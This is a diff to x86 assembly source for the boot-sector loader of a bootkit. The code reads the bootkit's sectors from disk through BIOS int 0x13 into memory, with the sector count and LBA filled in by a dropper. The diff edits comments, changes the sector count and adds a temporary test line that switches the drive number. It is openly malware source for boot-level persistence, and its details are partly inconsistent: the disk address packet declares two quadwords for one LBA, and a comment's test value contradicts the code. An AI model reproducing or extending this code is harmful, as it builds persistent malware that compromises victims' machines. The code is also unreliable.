@@ -10,7 +10,7 @@ BOOTKIT_BASE    EQU 0x4000           ; address where the bootkit gets loaded
 
 start:
 jmp real_start                       ; jump over the "data section" to the "code section"
-times 4 - ($-$$) nop                 ; align "data section" to a 4 byte boundary
+times 4-($-$$) nop                   ; align "data section" to a 4 byte boundary
 
 ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 ;;           data section         ;;
@@ -20,14 +20,14 @@ times 4 - ($-$$) nop                 ; align "data section" to a 4 byte boundary
 ; Disk Address Packet (DAP) structure. Used to read the bookit sectors from disk via LBA addressing with BIOS int 0x13
 ; See: https://wiki.osdev.org/Disk_access_using_the_BIOS_(INT_13h)
 ; Note:
-; - The actual values for number of sectors to transfer and the LBA address of the bootkit are filled in by the dropper,
-;   as they are determined in the bootkit installation process.
+; - The actual values for "number of sectors to transfer" and the LBA address of the bootkit are filled in by the dropper,
+;   as they are determined when the bootkit is installed.
 ;
 bootkit_dap: 
     db 0x10                          ; size of packet (16 bytes)
     db 0x00                          ; unused (always 0)
-    dw 0x00                          ; number of sectors to transfer
-    dw BOOTKIT_BASE                  ; transfer buffer (16 bit offset). offset comes before segment due to little endian
+    dw 0x01                          ; number of sectors to transfer (set to 0x02 for testing. overwritten by dropper)
+    dw BOOTKIT_BASE                  ; transfer buffer (16 bit offset)
     dw 0x00                          ; transfer buffer (16 bit segment)
     dq 0x00                          ; lower 32-bits of 48-bit starting LBA
     dq 0x00                          ; upper 16-bits of 48-bit starting LBA
@@ -49,13 +49,13 @@ real_start:
     sti                              ; initialization done, reenable interrupts
 
 ;
-; Load bootkit from disk to memory
+; Load bootkit from disk
 ; See: https://mbldr.sourceforge.net/specsedd30.pdf
 ;
 ; BIOS int 0x13, ah = 0x42
 ; Arguments:
 ;   ah = 0x42
-;   dl = 0x80                        (drive number)
+;   dl = 0x80                        (drive number, 0x80 = first hard disk)
 ;   es:si = 0x0000:bootkit_dap       (disk address packet)
 ; Returns:
 ;   carry flag clear: ah = 0
@@ -63,6 +63,9 @@ real_start:
 ;
 load_bootkit:
     mov ah, 0x42
+; FOR TESTING START (remove after)
+    mov dl, 0x81
+; FOR TESTING END
     mov si, bootkit_dap
     int 0x13
     jc error                         ; error:   stop
